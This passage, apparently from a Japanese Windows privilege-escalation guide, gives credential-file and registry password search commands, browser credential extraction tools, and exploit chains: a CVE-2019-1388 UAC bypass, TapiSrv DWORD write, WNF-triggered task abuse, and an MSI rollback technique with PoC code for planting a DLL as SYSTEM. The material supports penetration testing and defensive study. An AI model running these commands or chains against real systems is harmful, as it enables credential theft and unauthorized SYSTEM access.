読み取り可能な KeePass `.kdbx` も、暗号化された vault の手がかりにすぎません。ロック解除には、実際の master password と、設定されている key file やアカウント要素が必要です。承認された調査でエントリに LM:NT hash pair が見つかった場合は、[pass-the-hash](../ntlm/README.md#pass-the-hash) を検討する前に、記載されたアカウントを確認し、NT hash が最新で、対象の NTLM サービスで受け入れられるかを検証してください。vault のエントリだけで Administrator または SYSTEM 権限が得られるわけではありません。リモートサービスへのアクセス、アカウント権限、および別途必要なサービス実行手順も満たす必要があります。インベントリには vault のパスと読み取り可否を記録し、データベースや保存された認証情報を出力しないでください。

提案されたすべてのファイルを検索します：

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### RecycleBin 内の認証情報

アクセス可能なごみ箱のエントリを確認し、削除されたバックアップや構成アーカイブのほか、名前に認証情報が明記されたファイルを探します。有用な `.7z`、`.zip`、`.rar` バックアップは、数か月前のもので、ありふれたファイル名が付いている場合もあります。Windows は元のパスと削除日時を `$I` レコードに保存し、削除されたファイルを対応する `$R` エントリとして保存します。アーカイブを開く前に、メタデータと現在の ID による読み取りアクセス権を確認してください。表示される内容はボリューム、ユーザー SID、ファイル権限によって異なるため、一覧が空でも復元可能なバックアップが存在しないとは限りません。アーカイブ名は調査候補であり、有効な秘密情報が含まれている証拠ではありません。

アクセス可能な削除済み `.pfx` ファイルは、**code-signing** の手掛かりにもなります。アクセス可能な秘密鍵が含まれていれば、その鍵で変更した PowerShell スクリプトに署名できます。[PowerShell で署名するには、秘密鍵を持つ code-signing 証明書が必要です](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature)。また、[AppLocker の発行元ルールでは、署名者の ID とルールの適用範囲が評価されます](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker)。別のアカウントで実行させるには、現在の ID によって対象スクリプトそのものを変更できること、スクリプトと対象アカウントに対して有効なルールが変更後の署名を許可すること、さらに高い権限で動作するスケジュールされたタスクなどが実際にそのスクリプトを実行することが必要です。`.pfx` のファイル名、証明書のサブジェクト、書き込み可能なスクリプトだけでは、この一連の条件が満たされるとは限りません。秘密鍵の内容を開いたりタスクを実行したりする前に、メタデータ、ACL、ポリシー、スケジュールされたコマンドを確認してください。

また、アクセス可能なメッセージングクライアントのプロファイルデータベース、メモ、受信ファイルも確認し、認証情報の手掛かりを探してください。BitLocker 回復情報のエクスポートは HTML や TXT として保存されている場合があり、名前の付いたバックアップアーカイブに含まれていることもあります。こうした情報から、古いバックアップを含む別の暗号化データボリュームにアクセスできる場合があります。アクセスが許可されている場合に限り、そのボリュームとアーカイブを調査してください。バックアップに `NTDS.dit` が含まれている場合、オフラインでドメイン認証情報を復元するには、[バックアップと特権グループのワークフロー](../active-directory-methodology/privileged-groups-and-token-privileges.md)で説明されているとおり、対応する `SYSTEM` ハイブも必要です。ファイル名やロックされたボリュームだけでは、利用可能な回復キーやドメインバックアップが存在するとは限りません。

複数のプログラムに保存された**パスワードを復元する**には、次を使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**認証情報を含む可能性のあるその他のレジストリキー**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**レジストリからOpenSSHキーを抽出する。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザーの履歴

**Chrome、Edge、Firefox**のパスワードが保存されているデータベースを確認してください。\
また、ブラウザーの履歴、ブックマーク、お気に入りも確認してください。そこに**パスワードが保存されている**可能性があります。

現在のユーザーの標準的なEdgeの**Default**プロファイルでは、`Login Data`は`%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`にあり、`Local State`は親ディレクトリの`User Data`にあります。[Microsoftのドキュメントでは既定のプロファイルの場所が説明されています](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars)。別のプロファイルや`UserDataDir`ポリシーによって、場所が変更されている場合もあります。ファイルの存在は、認証情報の保存場所となり得るという手がかりにすぎません。読み取り可能なファイルか、該当ユーザーのDPAPIコンテキストまたは他の認可されたキー素材が利用できるか、保存されたログイン情報がより高い権限を持つアカウントのものかを確認してください。パスだけを列挙するのであれば、データベースを開いたり、復号したパスワードを表示したりする必要はありません。

Firefoxについては、[Mozillaのドキュメント](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile)によると、プロファイル内の`key4.db`と`logins.json`は、キーと暗号化されたログイン情報のペアとなるファイルです。これらの存在は手がかりにすぎません。両方のファイルが読み取り可能か、保存されたエントリがあるか、キーがPrimary Passwordで保護されているかを確認してから、認証情報が利用可能だと判断してください。復元した認証情報がドメインアカウントのものなら、そのアカウントに実効的なグループ制御権限があるかと、グループの[LAPSパスワードの読み取りまたは復号権限](../active-directory-methodology/laps.md)をそれぞれ確認してください。ブラウザーのアーティファクトだけでは、管理者権限への経路があるとは判断できません。

ブラウザーからパスワードを抽出するツール:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**コンポーネント オブジェクト モデル (COM)**は、異なる言語で作られたソフトウェアコンポーネント間の**相互通信**を可能にする、Windowsオペレーティングシステムに組み込まれた技術です。各COMコンポーネントは**クラスID (CLSID)で識別され**、各コンポーネントは1つ以上のインターフェースを通じて機能を公開します。インターフェースはインターフェースID (IID)で識別されます。

COMクラスとインターフェースは、それぞれレジストリの**HKEY\CLASSES\ROOT\CLSID**と**HKEY\CLASSES\ROOT\Interface**に定義されています。このレジストリは、**HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT**を統合して作成されます。

このレジストリのCLSID内には、子レジストリ**InProcServer32**があります。ここには、**DLL**を指す**既定値**と、**Apartment**（シングルスレッド）、**Free**（マルチスレッド）、**Both**（シングルまたはマルチスレッド）、**Neutral**（スレッド中立）のいずれかを指定できる**ThreadingModel**という値が含まれています。

![ブラウザーの履歴 - COM DLL Overwriting: このレジストリのCLSID内には子レジストリInProcServer32があり、DLLを指す既定値と、値を含みます...](<../../images/image (729).png>)

基本的に、実行されるDLLを**上書きできれば**、そのDLLが別のユーザーによって実行される場合に**権限昇格**が可能です。

攻撃者が永続化の手段としてCOM Hijackingをどのように使うかについては、次を確認してください:


{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイルおよびレジストリ内の一般的なパスワード検索**

**ファイルの内容を検索する**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**特定のファイル名のファイルを検索する**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**レジストリでキー名とパスワードを検索**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **はmsf**プラグインです。私が作成したこのプラグインは、被害者のシステム内で認証情報を検索するすべてのMetasploit POST moduleを**自動的に実行**します。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)は、このページで紹介しているパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne)も、システムからパスワードを抽出する優れたツールです。

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher)は、データを平文で保存する複数のツール（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の**セッション**、**ユーザー名**、**パスワード**を検索します。

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

**SYSTEM として実行中のプロセスが、フルアクセス権で新しいプロセスを開く** (`OpenProcess()`) とします。同じプロセスが、**メインプロセスの開いているすべてのハンドルを継承する、低い権限の新しいプロセスも作成します** (`CreateProcess()`)。\
その後、**低い権限のプロセスにフルアクセスできる**場合、`OpenProcess()` で作成された特権プロセスへの**開いているハンドルを取得**し、**shellcode を inject**できます。\
[この脆弱性の**検出と悪用方法**の詳細は、こちらの例を参照してください。](leaked-handle-exploitation.md)\
[プロセスやスレッドが異なる権限レベル（フルアクセスだけではありません）で継承した、より多くのオープンハンドルをテストして悪用する方法について、より詳しく解説した**別の記事はこちら**です。](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)

## Named Pipe Client Impersonation

**pipes** と呼ばれる共有メモリセグメントを使うと、プロセス間の通信やデータ転送が可能になります。

Windows には **Named Pipes** という機能があり、異なるネットワーク上にある場合でも、無関係なプロセス間でデータを共有できます。これはクライアント／サーバー型のアーキテクチャに似ており、役割は **named pipe server** と **named pipe client** として定義されます。

**client** が pipe 経由でデータを送信すると、pipe を設定した **server** は、必要な **SeImpersonate** 権限を持っていれば、**client の ID を偽装**できます。模倣可能な pipe 経由で通信する**特権プロセス**を特定できれば、自分が設定した pipe とそのプロセスがやり取りした際に、その ID を採用して**より高い権限を取得**できます。この攻撃の実行方法については、[**こちら**](named-pipe-client-impersonation.md)と[**こちら**](#from-high-integrity-to-system)のガイドが参考になります。

また、次のツールを使うと、burp のようなツールで **named pipe の通信を intercept**できます：[**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept)。さらに、**すべての pipe を一覧表示して確認し、privesc の機会を探す**には、次のツールを利用できます：[**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

サーバーモードの Telephony service (TapiSrv) は `\\pipe\\tapsrv` (MS-TRP) を公開します。リモートの認証済みクライアントは、mailslot ベースの非同期イベント経路を悪用し、`ClientAttach` を使って、`NETWORK SERVICE` が書き込み可能な既存の任意のファイルに **4-byte write** を実行できます。その後、Telephony admin 権限を取得し、サービスとして任意の DLL をロードできます。全体の流れは次のとおりです。

- `pszDomainUser` に書き込み可能な既存のパスを設定して `ClientAttach` を呼び出します。サービスは `CreateFileW(..., OPEN_EXISTING)` でそのファイルを開き、非同期イベントの書き込みに使用します。
- 各イベントは、`Initialize` で指定した攻撃者制御の `InitContext` をそのハンドルに書き込みます。`LRegisterRequestRecipient` (`Req_Func 61`) で line app を登録し、`TRequestMakeCall` (`Req_Func 121`) をトリガーして、`GetAsyncEvents` (`Req_Func 0`) で取得します。その後、登録解除／shutdown すると、決定論的な書き込みを繰り返せます。
- `C:\Windows\TAPI\tsec.ini` の `[TapiAdministrators]` に自分を追加して再接続し、任意の DLL パスを指定して `GetUIDllName` を呼び出すと、`NETWORK SERVICE` として `TSPI_providerUIIdentify` が実行されます。

詳細：

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Windows で実行される可能性のあるファイル拡張子

**[https://filesec.io/](https://filesec.io/)** を確認してください。

### Markdown renderer 経由の Protocol handler / ShellExecute abuse

`ShellExecuteExW` に渡されるクリック可能な Markdown link は、危険な URI handler (`file:`, `ms-appinstaller:`、または登録済みの任意の scheme) を起動し、攻撃者が制御するファイルを現在のユーザーとして実行する可能性があります。詳細：

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **パスワードを含むコマンドラインの監視**

ユーザーとして shell を取得したとき、**コマンドライン引数で認証情報を渡す**スケジュールタスクや他のプロセスが実行されている場合があります。以下の script は2秒ごとにプロセスのコマンドラインを取得し、現在の状態と前回の状態を比較して、差分を出力します。

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## プロセスからパスワードを盗む

## 低権限ユーザーから NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

コンソールまたは RDP 経由でグラフィカルインターフェースにアクセスでき、UAC が有効になっている場合、Microsoft Windows の一部のバージョンでは、権限のないユーザーからターミナルや「NT\AUTHORITY SYSTEM」などの別のプロセスを実行できます。

これにより、同じ脆弱性を使って、権限昇格と UAC のバイパスを同時に実行できます。さらに、何もインストールする必要はなく、このプロセスで使用するバイナリは Microsoft によって署名・発行されています。

影響を受けるシステムの一部を以下に示します。

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

この脆弱性を悪用するには、以下の手順を実行する必要があります:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

以下の GitHub リポジトリに、必要なファイルと情報がすべてあります。

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium から High Integrity Level への昇格 / UAC バイパス

**Integrity Levels について学ぶには、こちらを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

次に、**UAC と UAC バイパスについて学ぶには、こちらを読んでください:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## サーブされたルートへのアップロードディレクトリジャンクション

アプリケーションが予測可能なアップロード用サブディレクトリを作成し、呼び出し元が指定したファイル名でその中に書き込み、その後ファイルを処理することがあります。サーバー側で書き込みが行われる前に、低権限ユーザーがそのサブディレクトリを削除し、NTFS ジャンクションに置き換えられる場合、書き込みがジャンクションをたどって Web サーバーから配信されるディレクトリに到達することがあります。そこに配置されたスクリプトは、サーバーがそのファイル形式を実行する場合、Web サービスの ID で実行される可能性があります。これはアプリケーション固有の任意書き込み境界であり、書き込み可能なアップロードディレクトリや既存のジャンクションだけでは、その存在を証明できません。

アップロードハンドラーでの正確なパス構築と処理タイミング、ユーザーがそのサブディレクトリに対して持つ実効的な削除・作成権限、宛先の実効 ACL、書き込み処理が再解析ポイントをたどるかどうか、宛先で Web サーバーがファイルを実行するかどうかを確認してください。書き込み処理と Web サーバーのプロセス ID は、それぞれ個別に確認してください。受動的なインベントリでディレクトリ ACL と再解析メタデータを確認できますが、ハンドラーの動作や将来のジャンクション差し替えまでは確認できません。実行がサービスアカウントで行われる場合、別のトークン特権の経路を検討する前に、**実際のプロセストークン**を調べてください。

## WNF によってトリガーされる特権付きスケジュールタスクのクリーンアップ

手動実行を拒否するスケジュールタスクであっても、権限のないユーザーがトリガーできる可能性があります。特権付きタスクを監査する際は、XML をエクスポートし、タスク DACL、プリンシパル、アクションに加えて、**すべての**トリガーを調べてください。特に、`WnfStateChangeTrigger` は Windows Notification Facility (WNF) の状態を指定します。このセキュリティ保護可能な状態で現在のユーザーによる更新の発行が許可されている場合、`<AllowStartOnDemand>false</AllowStartOnDemand>` であっても、ユーザーはそのタスクを設定された ID で間接的に起動できます。<sup>[[43]](#references)</sup>

たとえば Recall の `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` タスクは SYSTEM として実行され、標準ユーザーからの WNF 状態 `7508BCA32C079E41` への更新を受け付け、Recall が無効になっていても `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` を調べていました。<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

到達可能性をテストするには、`ntdll.dll` から `ZwUpdateWnfStateData` を解決し、8 バイトの状態名に対して空の更新を送信して、戻りステータスをタスクの最終実行データまたは Procmon のアクティビティと照合します。以下の簡略化したプローブでは、Recall タスクの例で使われたバイト列を使用しています。テストするタスク用にエクスポートされたバイトに置き換えてください。<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### 再帰的なクリーンアップを特権削除に変える

有用なプリミティブはトリガー単独ではなく、攻撃者が制御するディレクトリを受け取る特権クリーンアップルーチンです。列挙から最終的な変更までの処理を追跡してください。プロファイル／セッションの検出、ワイルドカードで選択される子要素、`SHCreateItemFromParsingName`、`IFileOperation::DeleteItem` は、事前に確認されたパス名が後で再帰的にたどられることを示す強い兆候です。子孫が信頼できるディレクトリハンドルを基準に開かれ、削除前に検証されない場合、攻撃者は列挙から使用までの間に名前解決の対象を変更できます。<sup>[[43]](#references)</sup>

WNF トリガーを、以下で説明する[oplock、junction、Object Manager symlink による置き換え](#from-folder-contents-delete-to-system-eop)と組み合わせます。oplock により、正規の子要素を選択した後でクリーンアップ処理を一時停止させ、その間に書き込み可能な祖先ディレクトリを置き換えます。再開した特権削除処理は、`\RPC Control` 経由で保護対象を解決するようになります。Recall の攻撃チェーンでは、これにより、文書化されている MSI rollback 手法に必要な `C:\Config.Msi` の SYSTEM による削除を実現しました。<sup>[[31]](#references)[[43]](#references)</sup>

### 入れ子の子孫を使い、浅い reparse point 対策を回避する

攻撃者が制御するルートとその直下の子要素だけを検証しても、再帰的なパス名ベースの削除は安全になりません。検証済みのオブジェクトは正規のままにし、junction/oplock による置き換えをその下のさらに別の子要素に移します。すると、`IFileOperation::DeleteItem` は最終的に未検証の子孫に到達し、新たなターゲットをたどります。CVE-2026-20941 は、最初の Recall パッチで `UKP` と GUID 形式のディレクトリを検証した一方、従来の再帰削除処理を残したことで、まさにこの種の不完全な修正から発生しました。<sup>[[43]](#references)</sup>

安全な方法は、**すべての子孫**を、すでに信頼できるディレクトリハンドルを基準に開き、最終的に解決されたパス／オブジェクトを取得して検証し、検証済みのハンドルに対して削除 disposition を適用することです。パスの接頭辞を検証した後、再帰的なパス名ベースの削除に戻ってはいけません。パッチレビューでは、実際の呼び出し箇所における構造体も確認してください。この事例では、`NtCreateFile` で `OBJECT_ATTRIBUTES` を実行時に調査したところ、`RootDirectory` が非 NULL で、相対名が `{GUID}\\secure_file.lock` であることが分かりました。これにより、2つ目の `FILE_DELETE_ON_CLOSE` プリミティブを示唆していた誤解を招く逆コンパイラの出力が否定されました。<sup>[[43]](#references)</sup>

## 任意のフォルダーの削除／移動／名前変更から SYSTEM EoP へ

この手法は、exploit code が[**こちら**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)で公開されている、[**このブログ記事**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)で説明されています。<sup>[[31]](#references)[[32]](#references)</sup>

この攻撃は基本的に、Windows Installer の rollback 機能を悪用し、アンインストール処理中に正規のファイルを悪意あるファイルに置き換えます。そのために攻撃者は、`C:\Config.Msi` フォルダーを乗っ取るための**悪意ある MSI installer**を作成する必要があります。このフォルダーは後に Windows Installer が他の MSI パッケージのアンインストール中に rollback ファイルを保存するために使用します。rollback ファイルの内容は、悪意ある payload を含むように改変されます。

### Windows Installer COM クリーンアップパスへの注入（CVE-2025-27727）

低権限のクライアントは、`CMsiConfigurationManager` COM オブジェクト（CLSID/IID `{000C101C-0000-0000-C000-000000000046}`）を通じて、SYSTEM 権限の `msiexec.exe` サービスにアクセスできます。リバースエンジニアリングにより、関連する `IMsiServer` 呼び出しとして、vtable オフセット `0xA0` の `MsiBeginTransactionW`、`0xC8` の `SetEEUIDirectoryAndFilter`、`0x50` の `CleanupTempPackages` が特定されました。これらの名前とオフセットはリバースエンジニアリングによるもので、ビルドによって異なる場合があります。<sup>[[41]](#references)</sup>

非管理者の場合、`SetEEUIDirectoryAndFilter` は、指定されたパスを `DELETE`、`FILE_FLAG_BACKUP_SEMANTICS`、`FILE_FLAG_OPEN_REPARSE_POINT` を指定して開く間だけ、呼び出し元を impersonate します。これにより、呼び出し元にディレクトリを削除する権限があることを確認し、reparse point をたどらないようにします。しかし、確認したファイルオブジェクトを後続のクリーンアップ処理に結び付けるものではなく、そのファイルが Windows Installer によって作成されたことを証明するものでもありません。<sup>[[41]](#references)</sup>

`MsiBeginTransactionW` の後、`SetEEUIDirectoryAndFilter` は、呼び出し元の filter 引数に関係なく、そのパスをフォルダーとして処理するようスケジュールします。サービスは `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` の下に名前付き `REG_DWORD` 値を書き込みます。値の名前は呼び出し元が制御するパスで、データ `0x00000002` はフォルダーフラグです。その後、`CleanupTempPackages(NULL, FALSE)` がクリーンアップ処理を直接開始します。昇格された worker はレジストリ値を列挙し、パスの出所を確認せずに、フォルダー項目を再帰的な `FDeleteFolder` に渡します。通常の削除に失敗した場合、コードは `LockdownPath` を呼び出し、ファイル属性をクリアしてから再試行します。<sup>[[41]](#references)</sup>

`msi.dll` から特定された最小限の呼び出しシーケンスは次のとおりです。<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

有用なプリミティブは junction によるリダイレクトではなく、パスの再利用です。攻撃者が作成した `C:\Config.Msi` を登録して削除し、その後 Windows Installer に保護された rollback データとともに同じパスを再作成させます。クリーンアップ処理は古い `TempPackages` の名前を信頼し、新しいディレクトリを SYSTEM として削除します。reparse point は不要なため、これは `FILE_FLAG_OPEN_REPARSE_POINT` とリダイレクト信頼の緩和策が意図する境界を回避します。<sup>[[41]](#references)</sup>

この削除プリミティブは、次の rollback チェーンに利用できます。独立した `Installer\Folders` レコードは残したまま、保護された `C:\Config.Msi` を削除し、NULL DACL を設定して再作成します。そして、installer が DACL を強化する前に `WRITE_DAC` 権限で開いた handle を保持します。事前に開いた handle から `NtSetSecurityObject` を使って permissive な DACL を復元し、その後 rollback が再開する前に生成された `.rbs` を置き換えられます。<sup>[[41]](#references)</sup>

Microsoft は、新しい feature gate が有効な場合に `CMsiTransaction::SetEEUIDirectoryAndFilter` が `ScheduleFileOrFolderDelete` を呼び出さないようにして、このパスを修正しました。COM call は成功を返す場合がありますが、攻撃者が制御するパスは `TempPackages` に追加されなくなります。method の戻り値が成功したかどうかで patch の適用を判断せず、2025年4月の Windows security update を適用してください。<sup>[[41]](#references)[[42]](#references)</sup>

要約すると、手法は次のとおりです。

1. **Stage 1 – Hijack の準備（`C:\Config.Msi` を空にする）**

- Step 1: MSI をインストールする
    - 書き込み可能なフォルダー（`TARGETDIR`）に無害なファイル（例: `dummy.txt`）をインストールする `.msi` を作成します。
    - installer を **"UAC Compliant"** としてマークし、**非管理者ユーザー**が実行できるようにします。
    - インストール後もファイルの **handle** を開いたままにします。

- Step 2: アンインストールを開始する
    - 同じ `.msi` をアンインストールします。
    - アンインストール処理がファイルを `C:\Config.Msi` に移動し、`.rbf` ファイル（rollback backup）に名前を変更し始めます。
    - 開いているファイル handle に対して **`GetFinalPathNameByHandle` をポーリング**し、ファイルが `C:\Config.Msi\<random>.rbf` になるのを検出します。

- Step 3: カスタム同期
    - `.msi` には **カスタムアンインストールアクション（`SyncOnRbfWritten`）**が含まれ、次の処理を行います。
        - `.rbf` が書き込まれたことを通知します。
        - その後、別の event を待ってからアンインストールを続行します。

- Step 4: `.rbf` の削除を阻止する
    - 通知を受けたら、`FILE_SHARE_DELETE` を指定せずに **`.rbf` ファイルを開きます**。これにより **削除を阻止できます**。
    - その後、アンインストールを完了できるよう通知を返します。
    - Windows Installer は `.rbf` の削除に失敗します。すべての内容を削除できないため、**`C:\Config.Msi` は削除されません**。

- Step 5: `.rbf` を手動で削除する
    - 攻撃者自身で `.rbf` ファイルを削除します。
    - これで **`C:\Config.Msi` が空になり**、Hijack の準備が整います。

> この時点で、**SYSTEM 権限で任意のフォルダーを削除できる脆弱性を利用し**、`C:\Config.Msi` を削除します。

2. **Stage 2 – Rollback script を悪意あるものに置き換える**

- Step 6: 弱い ACL で `C:\Config.Msi` を再作成する
    - `C:\Config.Msi` フォルダーを自分で再作成します。
    - **弱い DACL**（例: Everyone:F）を設定し、`WRITE_DAC` 権限を持つ handle を開いたままにします。

- Step 7: 別のインストールを実行する
    - `.msi` を再度インストールします。設定は次のとおりです。
        - `TARGETDIR`: 書き込み可能な場所。
        - `ERROROUT`: 強制的に失敗させる変数。
    - このインストールで再び **rollback** を発生させ、`.rbs` と `.rbf` を読み込ませます。

- Step 8: `.rbs` を監視する
    - `ReadDirectoryChangesW` を使用し、新しい `.rbs` が現れるまで `C:\Config.Msi` を監視します。
    - ファイル名を記録します。

- Step 9: Rollback の前に同期する
    - `.msi` には **カスタムインストールアクション（`SyncBeforeRollback`）**が含まれ、次の処理を行います。
        - `.rbs` が作成されたときに event を通知します。
        - その後、続行する前に待機します。

- Step 10: 弱い ACL を再適用する
    - `.rbs created` event を受信すると、次の状態になります。
        - Windows Installer が `C:\Config.Msi` に **強い ACL を再適用します**。
        - ただし、`WRITE_DAC` 権限の handle をまだ保持しているため、再び **弱い ACL を適用できます**。

> ACL は **handle を開くときにのみ適用される**ため、引き続きフォルダーに書き込めます。

- Step 11: 偽の `.rbs` と `.rbf` を置く
    - `.rbs` ファイルを上書きし、Windows に次の処理を指示する **偽の rollback script** を書き込みます。
        - `.rbf` ファイル（悪意ある DLL）を、特権のある場所（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）に復元する。
    - **SYSTEM 権限で動作する悪意ある payload DLL** を含む偽の `.rbf` を置きます。

- Step 12: Rollback を実行する
    - sync event を通知し、installer を再開させます。
    - **type 19 のカスタムアクション（`ErrorOut`）**は、既知のタイミングでインストールを意図的に失敗させるよう設定されています。
    - これにより **rollback が開始します**。

- Step 13: SYSTEM が DLL をインストールする
    - Windows Installer が次の処理を行います。
        - 悪意ある `.rbs` を読み込みます。
        - `.rbf` の DLL をターゲットの場所にコピーします。
    - これで **SYSTEM が読み込むパスに悪意ある DLL が配置されます**。

- 最終ステップ: SYSTEM 権限でコードを実行する
    - Hijack した DLL を読み込む、信頼された **自動昇格バイナリ**（例: `osk.exe`）を実行します。
    - **これで、コードが SYSTEM として実行されます。**

### 任意のファイル削除・移動・名前変更から SYSTEM EoP へ

主な MSI rollback 手法（前述）は、`C:\Config.Msi` のような **フォルダー全体を削除できること**を前提としています。しかし、脆弱性で可能なのが **任意のファイル削除**だけの場合はどうでしょうか？

**NTFS の内部仕様**を利用できます。すべてのフォルダーには、次の名前の隠し alternate data stream があります。

```
C:\SomeFolder::$INDEX_ALLOCATION
```

この stream には、フォルダーの**インデックスメタデータ**が格納されています。

そのため、フォルダーの `::$INDEX_ALLOCATION` stream を**削除**すると、NTFS はファイルシステムから**フォルダー全体を削除**します。

これは、次のような標準のファイル削除 API を使って実行できます。
```c
